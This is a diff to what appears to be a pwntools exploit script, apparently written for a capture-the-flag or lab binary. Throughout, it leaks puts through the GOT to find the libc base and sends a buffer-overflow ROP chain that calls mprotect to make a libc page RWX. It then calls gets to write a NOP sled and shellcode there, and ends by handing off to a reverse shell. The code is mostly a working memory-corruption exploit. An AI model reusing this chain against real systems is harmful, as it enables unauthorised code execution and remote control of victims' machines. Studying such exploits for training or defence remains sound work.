@@ -40,23 +40,26 @@ def attempt_r2libc_shellcode(puts_offset, mprotect_offset):
     puts_addr = leak_via_puts(CONN, PORT, GOT_PUTS)
 
     libc_base = puts_addr - puts_offset
-    
     code_address = libc_base
     page_aligned_address = code_address & ~0xfff
-    payload = b'A' * BUFF_SIZE + p32(mprotect_offset + libc_base) + p32(MAIN_ADDR) + p32(page_aligned_address) + p32(0x21000) + p32(0x7)
-    proc.sendline(payload)
-    log.success(f"Changed protections for {hex(page_aligned_address)}-{hex(page_aligned_address+0x21000)} to RWX with mprotect")
 
-    code_address = libc_base
-    payload = b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(code_address) + p32(code_address)
+    payload = b'A' * BUFF_SIZE
+    payload += p32(mprotect_offset + libc_base)
+    payload += p32(MAIN_ADDR)
+    payload += p32(page_aligned_address) + p32(0x21000) + p32(0x7)
     proc.sendline(payload)
-    log.success(f"Called gets({hex(code_address)}) with {hex(code_address)} as return addr")
 
-    # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
+    # Send shellcode
     shellcode_payload = b'\x90' * 20 + SHELLCODE
+    proc.sendline(b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(code_address) + p32(code_address))
+    log.success(f"Called gets({hex(code_address)}) with {hex(code_address)} as return addr")
     proc.sendline(shellcode_payload)
     log.success(f"Sent shellcode to {hex(code_address)} via gets")
 
+    collect_output(proc)
+    return handle_reverse_shell()
+
+def collect_output(proc):
     output = b""
     while True:
         try:
@@ -64,11 +67,11 @@ def attempt_r2libc_shellcode(puts_offset, mprotect_offset):
             if not current_line:
                 break
             output += current_line
-        except:
+        except Exception as e:
+            print(f"Error occurred while receiving output: {e}")
             break
-    
-    # Check if reverse shell was spawned then handle user input and output for the process
-    return handle_reverse_shell()
+    return output
+
 
 def handle_reverse_shell():
     """
